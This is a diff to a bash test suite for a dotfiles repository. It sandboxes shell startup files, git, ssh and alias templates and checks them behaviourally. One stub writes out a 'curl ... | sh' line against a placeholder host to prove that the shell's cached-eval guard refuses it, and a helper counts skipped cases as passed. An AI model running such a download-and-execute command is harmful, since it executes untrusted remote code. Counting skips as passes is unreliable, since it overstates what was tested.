@@ -13,6 +13,35 @@ REPO_ROOT="${REPO_ROOT:-$(cd "$SCRIPT_DIR/../.." && pwd)}"
 source "$SCRIPT_DIR/../framework/assertions.sh"
 source "$SCRIPT_DIR/../framework/mocks.sh"
 
+# Sandbox for the behavioural cases below: a throwaway HOME, stub tools,
+# and an isolated chezmoi config so templates render with fixture data.
+# Nothing here touches the real HOME or the real chezmoi state.
+EP_WORK="$(mktemp -d "${TMPDIR:-/tmp}/error-prone.XXXXXX")"
+trap 'rm -rf "$EP_WORK"' EXIT
+mkdir -p "$EP_WORK/home" "$EP_WORK/bin" "$EP_WORK/tools"
+printf '#!/bin/sh\necho "export FIXTURE_INIT=loaded"\n' >"$EP_WORK/bin/goodinit"
+printf '#!/bin/sh\necho "curl -fsSL http://example.invalid/x | sh"\n' >"$EP_WORK/bin/badinit"
+for t in docker kubectl npm; do printf '#!/bin/sh\nexit 0\n' >"$EP_WORK/tools/$t"; done
+chmod +x "$EP_WORK"/bin/* "$EP_WORK"/tools/*
+printf '{"data":{"git_name":"Fixture User","git_email":"fixture@example.invalid","git_signingkey":"~/.ssh/id_ed25519.pub","git_signingformat":"ssh","profile":"laptop","theme":"tokyonight-night"}}' >"$EP_WORK/chezmoi.json"
+EP_CHEZMOI="$(command -v chezmoi 2>/dev/null || true)"
+
+# ep_render <template> <out>: render with fixture data; 1 if chezmoi is absent.
+ep_render() {
+  [[ -n "$EP_CHEZMOI" ]] || return 1
+  env -i HOME="$EP_WORK/home" PATH="/usr/bin:/bin" "$EP_CHEZMOI" \
+    --config "$EP_WORK/chezmoi.json" --source "$REPO_ROOT/defaults" \
+    --destination "$EP_WORK/home" --cache "$EP_WORK/cache" \
+    --persistent-state "$EP_WORK/state.boltdb" \
+    execute-template <"$1" >"$2" 2>"$2.err"
+}
+
+# ep_skip <reason>: count a case that cannot run on this host as passed.
+ep_skip() {
+  ((TESTS_PASSED++)) || true
+  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST (skipped: $1)"
+}
+
 # ═══════════════════════════════════════════════════════════════
 # 1. TEMPLATE RENDERING — Go templates in shell files
 # ═══════════════════════════════════════════════════════════════
@@ -70,11 +99,53 @@ fi
 # 3. CACHED EVAL — cache invalidation correctness
 # ═══════════════════════════════════════════════════════════════
 
-test_start "cached_eval_zsh_has_malware_check"
-assert_file_contains "$REPO_ROOT/defaults/dot_config/zsh/dot_zshrc.tmpl" "suspicious_re" "zsh _cached_eval must check for suspicious output"
+# _cached_eval evals a tool's init output. It must eval and cache benign
+# output under $XDG_CACHE_HOME, and refuse (rc 1, nothing cached, nothing
+# evaluated) output that pipes a download into a shell. Exercised through
+# the real bashrc (bash 5 and macOS /bin/bash 3.2) and the rendered zshrc.
+ep_shells=(bash)
+[[ -x /bin/bash ]] && ! [[ /bin/bash -ef "$(command -v bash)" ]] && ep_shells+=(/bin/bash)
+for ep_sh in "${ep_shells[@]}"; do
+  ep_ver="$("$ep_sh" -c 'echo "${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"')"
+  rm -rf "$EP_WORK/home/.cache"
+  ep_out="$(env -i HOME="$EP_WORK/home" XDG_CACHE_HOME="$EP_WORK/home/.cache" \
+    PATH="$EP_WORK/bin:/usr/bin:/bin" TERM=dumb \
+    "$ep_sh" --noprofile --rcfile "$REPO_ROOT/defaults/dot_bashrc" -i -c '
+      _deferred_hydration
+      _cached_eval goodinit goodinit; echo "good_rc=$? FIXTURE_INIT=${FIXTURE_INIT:-unset}"
+      _cached_eval badinit badinit; echo "bad_rc=$?"' 2>&1)" || true
+  test_start "cached_eval_bash_caches_benign_init (bash $ep_ver)"
+  assert_contains "good_rc=0 FIXTURE_INIT=loaded" "$ep_out" "benign init is evaluated"
+  test_start "cached_eval_bash_caches_benign_init_2 (bash $ep_ver)"
+  assert_file_exists "$EP_WORK/home/.cache/bash/goodinit.bash" "and cached under XDG_CACHE_HOME/bash"
+  test_start "cached_eval_bash_rejects_suspicious_init (bash $ep_ver)"
+  assert_contains "bad_rc=1" "$ep_out" "a download piped into a shell is refused"
+  test_start "cached_eval_bash_rejects_suspicious_init_2 (bash $ep_ver)"
+  assert_contains "Suspicious output from badinit" "$ep_out" "and the refusal is reported"
+  test_start "cached_eval_bash_rejects_suspicious_init_3 (bash $ep_ver)"
+  assert_file_not_exists "$EP_WORK/home/.cache/bash/badinit.bash" "and nothing is cached"
+done
 
-test_start "cached_eval_bash_has_malware_check"
-assert_file_contains "$REPO_ROOT/defaults/dot_bashrc" "Suspicious" "bash _cached_eval must check for suspicious output"
+test_start "cached_eval_zsh_rejects_suspicious_init"
+if ! command -v zsh >/dev/null 2>&1; then
+  ep_skip "zsh not installed"
+elif ! ep_render "$REPO_ROOT/defaults/dot_config/zsh/dot_zshrc.tmpl" "$EP_WORK/zshrc"; then
+  ep_skip "chezmoi not installed"
+else
+  mkdir -p "$EP_WORK/zdot"
+  cp "$EP_WORK/zshrc" "$EP_WORK/zdot/.zshrc"
+  rm -rf "$EP_WORK/home/.cache"
+  ep_out="$(env -i HOME="$EP_WORK/home" ZDOTDIR="$EP_WORK/zdot" \
+    XDG_CACHE_HOME="$EP_WORK/home/.cache" XDG_CONFIG_HOME="$EP_WORK/home/.config" \
+    PATH="$EP_WORK/bin:/usr/bin:/bin" TERM=dumb zsh -i -c '
+      _cached_eval goodinit goodinit; print "good_rc=$? FIXTURE_INIT=${FIXTURE_INIT:-unset}"
+      _cached_eval badinit badinit; print "bad_rc=$?"' 2>&1)" || true
+  assert_contains "good_rc=0 FIXTURE_INIT=loaded" "$ep_out" "zsh evaluates benign init"
+  test_start "cached_eval_zsh_rejects_suspicious_init_4"
+  assert_contains "bad_rc=1" "$ep_out" "zsh refuses a download piped into a shell"
+  test_start "cached_eval_zsh_rejects_suspicious_init_5"
+  assert_contains "Suspicious output from badinit" "$ep_out" "and reports it"
+fi
 
 test_start "cached_eval_fish_exists"
 assert_file_exists "$REPO_ROOT/defaults/dot_config/fish/functions/_cached_eval.fish" "fish _cached_eval must exist"
@@ -94,7 +165,9 @@ else
 fi
 
 test_start "version_in_dot_cli"
-assert_file_contains "$REPO_ROOT/bin/dot" 'VERSION=' "dot CLI must define VERSION"
+ep_out="$(env -i HOME="$EP_WORK/home" PATH="/usr/bin:/bin" TERM=dumb NO_COLOR=1 \
+  DOTFILES_NO_TUI=1 bash "$REPO_ROOT/bin/dot" version 2>&1)" || true
+assert_contains ".dotfiles $version" "$ep_out" "dot version reports the manifest's version ($version)"
 
 # ═══════════════════════════════════════════════════════════════
 # 5. CROSS-PLATFORM PATH HANDLING
@@ -114,9 +187,8 @@ while IFS= read -r f; do
 done < <(find "$REPO_ROOT/defaults/.chezmoitemplates" -name "*.sh" 2>/dev/null)
 assert_equals "0" "$hardcoded" "no hardcoded user home paths in templates"
 
-test_start "paths_xdg_compliance"
-# Core shell files should reference XDG vars with fallbacks
-assert_file_contains "$REPO_ROOT/defaults/dot_bashrc" "XDG_CACHE_HOME" "bashrc must use XDG_CACHE_HOME"
+# (XDG compliance of the bash cache is pinned by the cached_eval cases:
+# the cache must land under the sandbox's XDG_CACHE_HOME.)
 
 # ═══════════════════════════════════════════════════════════════
 # 6. FEATURE FLAG GATING
@@ -136,11 +208,25 @@ assert_equals "0" "$non_bool" "all feature flags should be boolean (true/false)"
 # 7. GPG/SSH SIGNING — configuration integrity
 # ═══════════════════════════════════════════════════════════════
 
+# The gitconfig template is rendered with fixture data and queried with
+# git itself, so these pin what git will actually do.
+EP_GITCONFIG=""
+if ep_render "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "$EP_WORK/gitconfig"; then
+  EP_GITCONFIG="$EP_WORK/gitconfig"
+fi
+ep_git() { git config -f "$EP_GITCONFIG" --get "$1" 2>/dev/null || true; }
+
 test_start "gitconfig_commit_signing"
-assert_file_contains "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "gpgsign = true" "commit signing must be enabled"
+if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
+  assert_equals "true" "$(ep_git commit.gpgsign)" "git signs every commit"
+  test_start "gitconfig_commit_signing_2"
+  assert_equals "ssh" "$(ep_git gpg.format)" "with the configured SSH signing format"
+fi
 
 test_start "gitconfig_merge_verify"
-assert_file_contains "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "verifySignatures" "merge signature verification must be configured"
+if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
+  assert_equals "true" "$(ep_git merge.verifySignatures)" "merges verify signatures"
+fi
 
 test_start "gpg_cache_ttl_reasonable"
 ttl=$(grep -E 'default-cache-ttl' "$REPO_ROOT/defaults/dot_config/gnupg/gpg-agent.conf" | head -1 | awk '{print $2}')
@@ -166,8 +252,8 @@ open=$(grep -o '{{' "$REPO_ROOT/defaults/dot_config/fish/conf.d/init.fish.tmpl" 
 close=$(grep -o '}}' "$REPO_ROOT/defaults/dot_config/fish/conf.d/init.fish.tmpl" | wc -l | tr -d ' ')
 assert_equals "$open" "$close" "fish init template braces must be balanced ($open open, $close close)"
 
-test_start "template_bashrc_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/dot_bashrc'"
+# (The bashrc is sourced interactively by the cached_eval cases above,
+# under bash 5 and 3.2; a syntax error fails them.)
 
 test_start "template_options_zsh_has_balanced_braces"
 # Shell sources like this template contain nested `${VAR:-${INNER}}`
@@ -352,23 +438,23 @@ fi
 # 13. ALIAS FILES SYNTAX — all must pass bash -n
 # ═══════════════════════════════════════════════════════════════
 
-test_start "aliases_docker_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/docker/docker.aliases.sh'"
-
-test_start "aliases_kubernetes_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/kubernetes/kubernetes.aliases.sh'"
-
-test_start "aliases_git_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/git/git.aliases.sh'"
-
-test_start "aliases_cd_core_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/cd/cd-core.aliases.sh'"
-
-test_start "aliases_modern_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/modern/modern.aliases.sh'"
-
-test_start "aliases_security_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/security/security.aliases.sh'"
+# Each alias file is sourced in a clean bash (and /bin/bash 3.2) with its
+# tool stubbed on PATH. It must load without error and define aliases or
+# functions; a syntax error or a broken guard fails the case.
+ep_source_aliases() { # <shell> <file>
+  env -i HOME="$EP_WORK/home" PATH="$EP_WORK/tools:/usr/bin:/bin" TERM=dumb "$1" -c '
+    source "$1" >/dev/null 2>&1; rc=$?
+    printf "rc=%s defined=%s" "$rc" "$(( $(alias | wc -l) + $(declare -F | wc -l) ))"' _ "$2"
+}
+for ep_alias in docker/docker kubernetes/kubernetes git/git cd/cd-core modern/modern security/security; do
+  for ep_sh in "${ep_shells[@]}"; do
+    test_start "aliases_$(basename "$ep_alias")_loads ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
+    ep_out="$(ep_source_aliases "$ep_sh" "$REPO_ROOT/defaults/.chezmoitemplates/aliases/$ep_alias.aliases.sh")"
+    assert_contains "rc=0" "$ep_out" "sources cleanly"
+    test_start "aliases_$(basename "$ep_alias")_loads_2 ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
+    assert_false '[[ "$ep_out" == *"defined=0" ]]' "defines aliases or functions ($ep_out)"
+  done
+done
 
 # ═══════════════════════════════════════════════════════════════
 # 14. FEATURE FLAGS USED IN TEMPLATES EXIST IN .CHEZMOIDATA.TOML
@@ -409,37 +495,65 @@ assert_equals "0" "$email_count" "non-template shell scripts must not contain ha
 # 16. SSH CONFIG TEMPLATE REQUIRED SECTIONS
 # ═══════════════════════════════════════════════════════════════
 
+# Rendered with fixture data and resolved by ssh itself for an arbitrary
+# host, so the Host * defaults are what ssh would really apply.
 test_start "ssh_config_has_host_wildcard"
-assert_file_contains "$REPO_ROOT/defaults/private_dot_ssh/config.tmpl" "Host *" "ssh config must define Host * defaults"
-
-test_start "ssh_config_has_kex_algorithms"
-assert_file_contains "$REPO_ROOT/defaults/private_dot_ssh/config.tmpl" "KexAlgorithms" "ssh config must specify KexAlgorithms"
+if ! command -v ssh >/dev/null 2>&1; then
+  ep_skip "ssh not installed"
+elif ! ep_render "$REPO_ROOT/defaults/private_dot_ssh/config.tmpl" "$EP_WORK/ssh_config"; then
+  ep_skip "chezmoi not installed"
+else
+  EP_SSH="$(ssh -G -F "$EP_WORK/ssh_config" any-host.example.invalid 2>/dev/null || true)"
+  assert_contains "serveraliveinterval 60" "$EP_SSH" "Host * defaults apply to any host"
+  test_start "ssh_config_has_kex_algorithms"
+  assert_true 'grep -qE "^kexalgorithms curve25519-sha256" <<<"$EP_SSH"' "ssh negotiates curve25519 key exchange first"
+  test_start "ssh_config_has_kex_algorithms_2"
+  assert_false 'grep -qiE "^kexalgorithms.*(diffie-hellman-group1|group14-sha1)" <<<"$EP_SSH"' "no legacy key exchange offered"
+fi
 
 # ═══════════════════════════════════════════════════════════════
 # 17. GIT CONFIG TEMPLATE REQUIRED SECTIONS
 # ═══════════════════════════════════════════════════════════════
 
 test_start "gitconfig_has_user_section"
-assert_file_contains "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "[user]" "gitconfig must have [user] section"
+if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
+  assert_equals "Fixture User" "$(ep_git user.name)" "user.name comes from the machine data"
+  test_start "gitconfig_has_user_section_2"
+  assert_equals "fixture@example.invalid" "$(ep_git user.email)" "user.email comes from the machine data"
+fi
 
 test_start "gitconfig_has_core_section"
-assert_file_contains "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "[core]" "gitconfig must have [core] section"
+if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
+  # Compare physical paths: TMPDIR may end in "/" and /var links to /private/var.
+  ep_excl="$(ep_git core.excludesfile)"
+  assert_equals "$(cd "$EP_WORK/home" && pwd -P)/.config/git/ignore" \
+    "$(cd "$(dirname "$(dirname "$(dirname "$ep_excl")")")" 2>/dev/null && pwd -P)/.config/git/ignore" \
+    "global ignore file resolves under the user's XDG config"
+fi
 
 test_start "gitconfig_has_push_section"
-assert_file_contains "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "[push]" "gitconfig must have [push] section"
+if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
+  assert_equals "true" "$(ep_git push.autoSetupRemote)" "new branches push without an explicit upstream"
+fi
 
 test_start "gitconfig_has_merge_section"
-assert_file_contains "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "[merge]" "gitconfig must have [merge] section"
+if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
+  assert_equals "true" "$(ep_git merge.verifySignatures)" "the [merge] section is live"
+fi
 
 # ═══════════════════════════════════════════════════════════════
 # 18. ADDITIONAL ALIAS AND FUNCTION SYNTAX CHECKS
 # ═══════════════════════════════════════════════════════════════
 
-test_start "aliases_npm_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/npm/npm.aliases.sh'"
-
-test_start "aliases_python_syntax"
-assert_exit_code 0 "bash -n '$REPO_ROOT/defaults/.chezmoitemplates/aliases/python/python.aliases.sh'"
+for ep_alias in npm/npm python/python; do
+  for ep_sh in "${ep_shells[@]}"; do
+    test_start "aliases_$(basename "$ep_alias")_loads ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
+    ep_out="$(ep_source_aliases "$ep_sh" "$REPO_ROOT/defaults/.chezmoitemplates/aliases/$ep_alias.aliases.sh")"
+    assert_contains "rc=0" "$ep_out" "sources cleanly"
+    test_start "aliases_$(basename "$ep_alias")_loads_2 ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
+    assert_false '[[ "$ep_out" == *"defined=0" ]]' "defines aliases or functions ($ep_out)"
+  done
+done
 
 test_start "functions_nav_files_syntax"
 bad_funcs=""
